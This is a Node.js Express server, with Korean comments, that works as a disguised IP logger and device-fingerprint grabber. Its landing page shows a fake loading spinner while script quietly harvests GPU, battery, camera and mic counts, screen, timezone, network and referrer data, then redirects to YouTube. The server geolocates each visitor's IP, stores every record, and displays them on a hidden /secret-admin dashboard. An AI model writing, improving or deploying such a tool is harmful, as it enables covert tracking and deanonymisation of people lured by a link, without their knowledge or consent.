const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// [파일 저장 경로 설정]
const DATA_FILE = path.join(__dirname, 'data.json');

// 기존 파일 데이터 불러오기 함수
function loadLogs() {
  try {
    if (fs.existsSync(DATA_FILE)) {
      const fileData = fs.readFileSync(DATA_FILE, 'utf8');
      return JSON.parse(fileData);
    }
  } catch (e) {
    console.error('파일 로드 실패:', e);
  }
  return [];
}

// 파일에 데이터 저장하기 함수
function saveLogs(logs) {
  try {
    fs.writeFileSync(DATA_FILE, JSON.stringify(logs, null, 2), 'utf8');
  } catch (e) {
    console.error('파일 저장 실패:', e);
  }
}

// [1] 메인 수집 및 리디렉션 페이지
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="ko">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>불러오는 중...</title>
      <style>
        body {
          margin: 0; padding: 0; background-color: #0f0f0f; color: #ffffff;
          font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
          display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh;
        }
        .spinner {
          width: 50px; height: 50px; border: 5px solid rgba(255, 255, 255, 0.2);
          border-top-color: #ff0000; border-radius: 50%; animation: spin 1s infinite linear; margin-bottom: 20px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        p { font-size: 18px; font-weight: 500; color: #cccccc; }
      </style>
    </head>
    <body>
      <div class="spinner"></div>
      <p>페이지를 불러오는 중입니다. 잠시만 기다려 주세요...</p>

      <script>
        function getFPS() {
          return new Promise((resolve) => {
            let start = performance.now();
            let frames = 0;
            function check() {
              frames++;
              let now = performance.now();
              if (now - start >= 500) {
                resolve(Math.round((frames * 1000) / (now - start)));
              } else {
                requestAnimationFrame(check);
              }
            }
            requestAnimationFrame(check);
          });
        }

        async function captureData() {
          const fps = await getFPS();
          const ua = navigator.userAgent;

          let appType = '일반 브라우저';
          if (ua.includes('KAKAOTALK')) appType = '카카오톡';
          else if (ua.includes('Instagram')) appType = '인스타그램';
          else if (ua.includes('NAVER')) appType = '네이버앱';
          else if (ua.includes('FB_IAB') || ua.includes('FB4A')) appType = '페이스북';
          else if (ua.includes('Line')) appType = '라인';

          let mediaDevicesInfo = 'N/A';
          try {
            if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
              const devices = await navigator.mediaDevices.enumerateDevices();
              const cams = devices.filter(d => d.kind === 'videoinput').length;
              const mics = devices.filter(d => d.kind === 'audioinput').length;
              mediaDevicesInfo = \`카메라:\${cams} / 마이크:\${mics}\`;
            }
          } catch(e) {}

          let pointerType = '기본 마우스/터치';
          if (matchMedia('(pointer: coarse)').matches) pointerType = '터치스크린 (손가락)';
          else if (matchMedia('(pointer: fine)').matches) pointerType = '정밀 마우스/트랙패드';

          const data = {
            timestamp: new Date().toLocaleString('ko-KR'),
            clientTime: new Date().toString(),
            userAgent: ua,
            appType: appType,
            darkMode: (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) ? '다크 모드' : '라이트 모드',
            fps: \`\${fps} Hz (\${fps < 45 ? '저전력 추정' : '일반'})\`,
            language: navigator.language || 'N/A',
            languages: navigator.languages ? navigator.languages.join(', ') : 'N/A',
            screenRes: \`\${screen.width}x\${screen.height}\`,
            viewportRes: \`\${window.innerWidth}x\${window.innerHeight}\`,
            pixelRatio: window.devicePixelRatio || 1,
            colorDepth: screen.colorDepth ? \`\${screen.colorDepth} bit\` : 'N/A',
            colorGamut: (window.matchMedia && window.matchMedia('(color-gamut: p3)').matches) ? 'Wide P3' : 'sRGB',
            orientation: screen.orientation ? screen.orientation.type : 'N/A',
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            utcOffset: \`UTC \${-(new Date().getTimezoneOffset() / 60)}시간\`,
            cpuCores: navigator.hardwareConcurrency || 'N/A',
            ram: navigator.deviceMemory ? \`약 \${navigator.deviceMemory} GB\` : 'N/A',
            maxTouchPoints: navigator.maxTouchPoints || 0,
            pointerType: pointerType,
            mediaDevices: mediaDevicesInfo,
            pdfSupport: navigator.pdfViewerEnabled ? '지원' : '미지원',
            cookieEnabled: navigator.cookieEnabled ? '허용' : '차단',
            connectionType: 'N/A',
            downlink: 'N/A',
            rtt: 'N/A',
            gpu: 'N/A',
            battery: 'N/A',
            referrer: document.referrer || '직접 접속 / 외부 링크'
          };

          if (navigator.connection) {
            data.connectionType = navigator.connection.effectiveType || 'N/A';
            data.downlink = navigator.connection.downlink ? \`\${navigator.connection.downlink} Mbps\` : 'N/A';
            data.rtt = navigator.connection.rtt ? \`\${navigator.connection.rtt} ms\` : 'N/A';
          }

          try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) {
              const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
              if (debugInfo) data.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            }
          } catch(e) {}

          try {
            if (navigator.getBattery) {
              const battery = await navigator.getBattery();
              data.battery = \`\${Math.round(battery.level * 100)}% (\${battery.charging ? '충전 중' : '사용 중'})\`;
            }
          } catch(e) {}

          try {
            await fetch('/collect', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(data)
            });
          } catch (e) {}

          window.location.href = 'https://www.youtube.com';
        }

        window.onload = captureData;
      </script>
    </body>
    </html>
  `);
});

// [2] IP 및 파일 저장 API
app.post('/collect', async (req, res) => {
  let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
  if (ip.includes(',')) ip = ip.split(',')[0].trim();

  let isp = 'N/A';
  let location = 'N/A';
  let netType = 'N/A';

  try {
    const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city,isp,mobile`);
    const geoData = await geoRes.json();
    if (geoData.status === 'success') {
      isp = geoData.isp;
      netType = geoData.mobile ? '모바일 데이터(5G/LTE)' : 'Wi-Fi / 유선';
      location = `${geoData.country} ${geoData.city}`;
    }
  } catch (e) {}

  const logs = loadLogs();
  const fullLog = {
    id: logs.length + 1,
    ip: ip,
    isp: isp,
    netType: netType,
    location: location,
    ...req.body
  };
  
  logs.unshift(fullLog);
  saveLogs(logs); // 파일로 저장
  res.status(200).json({ status: 'ok' });
});

// [3] 분리된 수집 항목 대시보드 (/secret-admin)
app.get('/secret-admin', (req, res) => {
  const logs = loadLogs();
  let rows = logs.map(log => `
    <tr>
      <td>${log.id}</td>
      <td><strong>${log.timestamp}</strong></td>
      <td><code>${log.ip}</code></td>
      <td>${log.location}</td>
      <td>${log.isp}</td>
      <td>${log.netType}</td>
      <td><b style="color:#d35400;">${log.appType}</b></td>
      <td>${log.battery}</td>
      <td>${log.fps}</td>
      <td>${log.darkMode}</td>
      <td>${log.screenRes} (픽셀비:${log.pixelRatio})</td>
      <td>${log.colorGamut} / ${log.colorDepth}</td>
      <td>${log.cpuCores}코어 / ${log.ram}</td>
      <td><small>${log.gpu}</small></td>
      <td>${log.pointerType} (${log.maxTouchPoints}점)</td>
      <td>${log.mediaDevices}</td>
      <td>${log.connectionType} (RTT:${log.rtt})</td>
      <td>${log.timezone} (${log.utcOffset})</td>
      <td>${log.language}</td>
      <td><small>${log.referrer}</small></td>
      <td><small style="font-size:10px; color:#7f8c8d;">${log.userAgent}</small></td>
    </tr>
  `).join('');

  res.send(`
    <!DOCTYPE html>
    <html lang="ko">
    <head>
      <meta charset="UTF-8">
      <title>항목별 정돈된 관리자 대시보드</title>
      <style>
        body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; padding: 10px; background: #f8f9fa; }
        h1 { color: #2c3e50; font-size: 18px; }
        .table-container { overflow-x: auto; max-width: 100%; background: #fff; box-shadow: 0 2px 5px rgba(0,0,0,0.1); border-radius: 6px; }
        table { width: 100%; border-collapse: collapse; white-space: nowrap; }
        th, td { border: 1px solid #e9ecef; padding: 8px 12px; font-size: 12px; text-align: left; }
        th { background-color: #2c3e50; color: white; font-weight: 600; position: sticky; top: 0; }
        tr:nth-child(even) { background-color: #f8f9fa; }
        tr:hover { background-color: #f1f3f5; }
        button { padding: 8px 16px; background: #27ae60; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; margin-bottom: 10px; }
      </style>
    </head>
    <body>
      <h1>📊 항목별 영구 저장 데이터 목록 (총 ${logs.length}건)</h1>
      <button onclick="location.reload()">🔄 대시보드 새로고침</button>
      <div class="table-container">
        <table>
          <thead>
            <tr>
              <th>#</th>
              <th>접속 시각</th>
              <th>IP 주소</th>
              <th>접속 위치</th>
              <th>통신사(ISP)</th>
              <th>망 종류</th>
              <th>접속 앱</th>
              <th>배터리</th>
              <th>화면 주사율</th>
              <th>테마</th>
              <th>화면 해상도</th>
              <th>디스플레이 색상</th>
              <th>CPU / RAM</th>
              <th>GPU (그래픽)</th>
              <th>입력 방식</th>
              <th>미디어 장치</th>
              <th>네트워크 핑</th>
              <th>시간대</th>
              <th>기본 언어</th>
              <th>유입 경로</th>
              <th>UserAgent (원문)</th>
            </tr>
          </thead>
          <tbody>
            ${rows || '<tr><td colspan="21" style="text-align:center;">수집된 데이터가 없습니다.</td></tr>'}
          </tbody>
        </table>
      </div>
    </body>
    </html>
  `);
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});


